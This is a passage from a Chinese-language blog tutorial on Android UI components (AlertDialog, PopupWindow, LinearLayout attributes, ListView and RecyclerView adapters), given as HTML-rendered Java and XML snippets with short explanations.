DialogInterface.OnClickListener() &#123;</span><br><span class="line">                    @Override</span><br><span class="line">                    public void onClick(DialogInterface dialog, int which) &#123;</span><br><span class="line">                        Log.e(TAG, &quot;点击了确定按钮&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                .setNegativeButton(&quot;取消&quot;, new DialogInterface.OnClickListener() &#123;</span><br><span class="line">                    @Override</span><br><span class="line">                    public void onClick(DialogInterface dialog, int which) &#123;</span><br><span class="line">                        Log.e(TAG, &quot;点击了取消按钮&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                .setNeutralButton(&quot;中间&quot;, new DialogInterface.OnClickListener() &#123;</span><br><span class="line">                    @Override</span><br><span class="line">                    public void onClick(DialogInterface dialog, int which) &#123;</span><br><span class="line">                        Log.e(TAG, &quot;点击了中间&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                .setView(dialogView)</span><br><span class="line">                .create()</span><br><span class="line">                .show();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>未添加setView前<br><img src="2.png"></p><p>添加setView</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">View dialogView = getLayoutInflater().inflate(R.layout.dialog_view, <span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><p>layout -&gt;dialog_view.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;horizontal&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:background</span>=<span class="string">&quot;#fff000&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:src</span>=<span class="string">&quot;@mipmap/ic_user&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;30dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;30dp&quot;</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;q0o0p-wow&quot;</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="3.png"></p><h2 id="0x09-PopupWindow"><a href="#0x09-PopupWindow" class="headerlink" title="0x09 PopupWindow"></a>0x09 PopupWindow</h2><p>一个弹出窗口控件，可以用来显示任意View，而且会浮动在当前activity的顶部   </p><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public void wowClick(View view) &#123;</span><br><span class="line"></span><br><span class="line">        View popupView = getLayoutInflater().inflate(R.layout.popup_view, null);</span><br><span class="line"></span><br><span class="line">        Button bt1 = popupView.findViewById(R.id.bt1);</span><br><span class="line">        Button bt2 = popupView.findViewById(R.id.bt2);</span><br><span class="line">        PopupWindow popupWindow = new PopupWindow(popupView, ViewGroup.LayoutParams.WRAP_CONTENT,</span><br><span class="line">                ViewGroup.LayoutParams.WRAP_CONTENT,</span><br><span class="line">                true); //true点击空白处消失</span><br><span class="line">        //设置背景图片</span><br><span class="line">        popupWindow.setBackgroundDrawable(getResources().getDrawable(R.drawable.ic_image,null));</span><br><span class="line"></span><br><span class="line">//        popupWindow.showAsDropDown(view); //相对某个控件的正下方,无偏移</span><br><span class="line">        popupWindow.showAsDropDown(view,view.getWidth(),view.getHeight());</span><br><span class="line"></span><br><span class="line">        bt1.setOnClickListener(new View.OnClickListener() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void onClick(View v) &#123;</span><br><span class="line">                Log.e(TAG, &quot;bt1&quot;);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        bt2.setOnClickListener(new View.OnClickListener() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void onClick(View v) &#123;</span><br><span class="line">                Log.e(TAG, &quot;bt2&quot;);</span><br><span class="line">                popupWindow.dismiss(); //点击bt2退出</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>layout -&gt;创建popup_view.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:background</span>=<span class="string">&quot;@mipmap/ic_user&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/bt1&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:padding</span>=<span class="string">&quot;5dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;q0o0p&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/bt2&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:padding</span>=<span class="string">&quot;5dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;wow&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>设置背景图片实现效果图<br><img src="4.png"></p><h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置加载动画</span></span><br><span class="line">popupWindow.setAnimationStyle(<span class="keyword">int</span> anmationStyle);</span><br><span class="line"><span class="comment">//设置触摸使能</span></span><br><span class="line">popupWindow.setTouchable(<span class="keyword">boolean</span> touchable);</span><br><span class="line"><span class="comment">//设置PopupWindow外面的触摸功能</span></span><br><span class="line">popupWindow.setOutsideTouchable(<span class="keyword">boolean</span> touchable);</span><br></pre></td></tr></table></figure><h2 id="0x10-layout布局"><a href="#0x10-layout布局" class="headerlink" title="0x10 layout布局"></a>0x10 layout布局</h2><h3 id="LinearLayout布局"><a href="#LinearLayout布局" class="headerlink" title="LinearLayout布局"></a>LinearLayout布局</h3><p>1.android:orientation:<br>布局中间件的排序方式:</p><ul><li>vertical,竖直</li><li>horizontal，水平</li></ul><ol start="2"><li>android:gravity:设置View中内容相对于View组件的对齐方式，比如一个Button内部的Text的位置，与android：layout_gravity有所区分，下一个说layout_gravity：</li></ol><p>1）center:在水平和竖直方向上都是居中 center_vertical和center_horizontal可想而知，不赘述</p><p>2）Top和Bottom：置顶与置底</p><p>3）left和right:置左和右</p><p>3.android:layout_gravity:设置该View相对于父View的位置关系，就是设置View组件相对于Container的对齐方式，比如一个button在linearlayout里，你想把该button放在靠左、靠右等位置就可以通过该属性设置：</p><p>对于线性布局来说，当orientation为竖直时，该属性只能设置水平方向上的放置位置，设为center的话，只是水平方向是居中的。</p><p>4.android:layout_marginLeft(Start)/Right(End)/Top/Bottom:调用该属性对象的本身与其他容器或组件的间隙</p><p>5.android:paddingRight/Left/Top/Bottom:调用该属性的对象里的内容与该对象本身有填充物占据。和2.3类似。</p><h2 id="0x11-ListView简单用法"><a href="#0x11-ListView简单用法" class="headerlink" title="0x11 ListView简单用法"></a>0x11 ListView简单用法</h2><p>Android ListView是一个组几个项目，并显示在垂直滚动列表。列表项会使用适配器自动插入到列表中，从内容源，如数组或数据库。<br> 一个适配器实际上UI组件和数据源之间的桥梁，填充数据到UI组件。适配器可以用来提供数据如：spinner，列表视图，网格视图等。<br>ListView和GridView 是 AdapterView 的子类，它们可以填充绑定到一个适配器，它从外部源检索数据，并创建一个视图表示每个数据项。</p><p>MainActivity.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Bean&gt; data = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            Bean bean = <span class="keyword">new</span> Bean();</span><br><span class="line">            bean.setName(<span class="string">&quot;root-q0o0p&quot;</span> + i);</span><br><span class="line">            data.add(bean);</span><br><span class="line">        &#125;</span><br><span class="line">        ListView listView = findViewById(R.id.lv);</span><br><span class="line">        listView.setAdapter(<span class="keyword">new</span> MyAdapter(data, <span class="keyword">this</span>));</span><br><span class="line">        listView.setOnItemClickListener(<span class="keyword">new</span> AdapterView.OnItemClickListener() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onItemClick</span><span class="params">(AdapterView&lt;?&gt; parent, View view, <span class="keyword">int</span> position, <span class="keyword">long</span> id)</span> </span>&#123;</span><br><span class="line">                Log.e(<span class="string">&quot;ww&quot;</span>, <span class="string">&quot;onclick&quot;</span> + position);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Bean.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Bean</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>MyAdapter.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAdapter</span> <span class="keyword">extends</span> <span class="title">BaseAdapter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">&quot;q0o0p&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Bean&gt; data;</span><br><span class="line">    <span class="keyword">private</span> Context context;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyAdapter</span><span class="params">(List&lt;Bean&gt; data, Context context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.data = data;</span><br><span class="line">        <span class="keyword">this</span>.context = context;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data.size();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getItem</span><span class="params">(<span class="keyword">int</span> position)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getItemId</span><span class="params">(<span class="keyword">int</span> position)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> position;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> View <span class="title">getView</span><span class="params">(<span class="keyword">int</span> position, View convertView, ViewGroup parent)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建Viewholder对象</span></span><br><span class="line">        ViewHolder viewHolder;</span><br><span class="line">        <span class="keyword">if</span> (convertView == <span class="keyword">null</span>) &#123;</span><br><span class="line">            viewHolder = <span class="keyword">new</span> ViewHolder();</span><br><span class="line">            convertView = LayoutInflater.from(context).inflate(R.layout.list_item, parent, <span class="keyword">false</span>);</span><br><span class="line">            <span class="comment">//viewHolder获取findViewById</span></span><br><span class="line">            viewHolder.textView = convertView.findViewById(R.id.tv);</span><br><span class="line">            convertView.setTag(viewHolder);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            viewHolder = (ViewHolder) convertView.getTag();</span><br><span class="line">        &#125;</span><br><span class="line">        viewHolder.textView.setText(data.get(position).getName());</span><br><span class="line"></span><br><span class="line">        Log.e(TAG, <span class="string">&quot;getView:&quot;</span>+position);</span><br><span class="line">        <span class="keyword">return</span> convertView;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//findById进行优化</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ViewHolder</span></span>&#123;</span><br><span class="line">        TextView textView;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>activity.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ListView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/lv&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">         /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>list_item.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span> <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/tv&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">&quot;20sp&quot;</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="5.png"></p><h2 id="0x12-RecyclerView的使用"><a href="#0x12-RecyclerView的使用" class="headerlink" title="0x12 RecyclerView的使用"></a>0x12 RecyclerView的使用</h2><p>从Android 5.0开始，谷歌公司推出了一个用于大量数据展示的新控件RecylerView，可以用来代替传统的ListView，更加强大和灵活。<br>build.gradle中添加如下信息</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 添加 RecyclerView包</span><br><span class="line">    implementation &#x27;androidx.recyclerview:recyclerview:1.1.0&#x27;</span><br></pre></td></tr></table></figure><p>main_activity.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Bean&gt; data = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            Bean bean = <span class="keyword">new</span> Bean();</span><br><span class="line">            bean.setName(<span class="string">&quot;q0o0p&quot;</span> + i);</span><br><span class="line">            data.add(bean);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        RecyclerView recyclerView = findViewById(R.id.rv);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">        LinearLayoutManager linearLayoutManager = new LinearLayoutManager(this);</span></span><br><span class="line"><span class="comment">        recyclerView.setLayoutManager(linearLayoutManager);*/</span></span><br><span class="line"></span><br><span class="line">        GridLayoutManager gridLayoutManager = <span class="keyword">new</span> GridLayoutManager(<span class="keyword">this</span>,<span class="number">3</span>);</span><br><span class="line">        recyclerView.setLayoutManager(gridLayoutManager);</span><br><span class="line"></span><br><span class="line">        MyAdapter myAdapter = <span class="keyword">new</span> MyAdapter(data, <span class="keyword">this</span>);</span><br><span class="line">        recyclerView.setAdapter(myAdapter);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Bean.java 和recyclerview_item.xml 同上<br>activity_main.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">androidx.recyclerview.widget.RecyclerView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/rv&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">         /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>MyAdapter.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAdapter</span> <span class="keyword">extends</span> <span class="title">RecyclerView</span>.<span class="title">Adapter</span>&lt;<span class="title">MyAdapter</span>.<span class="title">MyViewHolder</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Bean&gt; data;</span><br><span class="line">    <span class="keyword">private</span> Context context;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyAdapter</span><span class="params">(List&lt;Bean&gt; data, Context context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.data = data;</span><br><span class="line">        <span class="keyword">this</span>.context = context;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@NonNull</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> MyViewHolder <span class="title">onCreateViewHolder</span><span class="params">(<span 